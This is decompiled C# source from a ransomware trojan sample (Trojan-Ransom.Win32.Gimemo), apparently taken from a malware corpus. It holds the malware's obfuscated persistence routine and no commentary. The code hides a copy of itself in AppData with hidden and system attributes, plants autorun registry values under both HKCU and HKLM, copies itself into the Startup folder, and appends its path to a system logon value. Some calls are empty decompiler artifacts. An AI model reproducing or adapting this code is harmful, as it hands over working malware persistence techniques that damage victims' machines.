// Decompiled with JetBrains decompiler
// Type: 
// Assembly: cssrss, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 33E5F696-F6DE-4A9C-88FA-7590F5DCF59A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Gimemo.xqx-9bbdf97e90a8e8d82865621ec5c533a1f41933b694bafef2c4eebd22a0720916.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

internal sealed class \u0008
{
  [DebuggerNonUserCode]
  public \u0008()
  {
  }

  public static void \u0002()
  {
    string path2 = \u000F\u2000.\u0002(1359778263);
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u000F\u2000.\u0002(1359778094);
    string str2 = Path.Combine(str1, path2);
    if (Operators.CompareString(Environment.CurrentDirectory, str1, false) == 0)
      return;
    try
    {
      \u0008.\u0003();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (File.Exists(str2))
    {
      try
      {
        File.SetAttributes(str2, FileAttributes.Normal);
        File.Delete(str2);
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, str2);
        File.SetAttributes(str2, File.GetAttributes(str2) + 4 + 2 + 8192 + 1);
        Process.Start(new ProcessStartInfo());
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      try
      {
        if (!Directory.Exists(str1))
        {
          Directory.CreateDirectory(str1);
          File.SetAttributes(str1, File.GetAttributes(str1) + 4 + 2 + 1 + 8192);
        }
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, str2);
        Process.Start(new ProcessStartInfo());
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  public static void \u0003()
  {
    string Right = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u000F\u2000.\u0002(1359778108);
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \u000F\u2000.\u0002(1359778079);
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u000F\u2000.\u0002(1359778152), true);
      if (registryKey.GetValue(\u000F\u2000.\u0002(1359777956)) == null)
        registryKey.SetValue(\u000F\u2000.\u0002(1359777956), (object) Right);
      else if (Operators.CompareString((string) registryKey.GetValue(\u000F\u2000.\u0002(1359777956)), Right, false) != 0)
      {
        registryKey.DeleteValue(\u000F\u2000.\u0002(1359777956));
        registryKey.SetValue(\u000F\u2000.\u0002(1359777956), (object) Right);
      }
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      if (!File.Exists(str1))
      {
        try
        {
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, str1);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
      }
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u000F\u2000.\u0002(1359777963), true);
      if (registryKey.GetValue(\u000F\u2000.\u0002(1359777956)) == null)
        registryKey.SetValue(\u000F\u2000.\u0002(1359777956), (object) Right);
      else if (Operators.CompareString((string) registryKey.GetValue(\u000F\u2000.\u0002(1359777956)), Right, false) != 0)
      {
        registryKey.DeleteValue(\u000F\u2000.\u0002(1359777956));
        registryKey.SetValue(\u000F\u2000.\u0002(1359777956), (object) Right);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u000F\u2000.\u0002(1359778023), true);
      string str2 = registryKey.GetValue(\u000F\u2000.\u0002(1359778011)).ToString();
      if (!str2.Contains(Right))
        registryKey.SetValue(\u000F\u2000.\u0002(1359778011), (object) (str2 + Right + \u000F\u2000.\u0002(1359777832)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u000F\u2000.\u0002(1359777840), true);
      if (Operators.CompareString(registryKey.GetValue(\u000F\u2000.\u0002(1359777904)).ToString(), \u000F\u2000.\u0002(1359777856), false) != 0)
        return;
      registryKey.SetValue(\u000F\u2000.\u0002(1359777904), (object) \u000F\u2000.\u0002(1359777864));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
